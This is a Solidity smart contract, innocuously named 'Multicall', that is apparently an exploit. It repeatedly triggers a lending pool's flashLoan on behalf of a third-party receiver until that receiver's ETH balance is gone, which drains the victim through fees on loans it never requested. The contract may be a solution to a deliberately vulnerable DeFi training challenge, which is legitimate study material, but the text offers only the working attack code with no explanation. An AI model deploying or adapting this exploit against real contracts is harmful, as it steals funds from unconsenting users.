// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";

contract Multicall {
  using Address for address;
  address public pool;
  address public receiver;

   constructor(address _pool, address _receiver) {
    pool = _pool;
    receiver = _receiver;
   }

   function multicall() external {
     while(receiver.balance > 0) {
      pool.functionCall(abi.encodeWithSignature(
                "flashLoan(address,uint256)",
                receiver, 1 ether));
    }
   }
}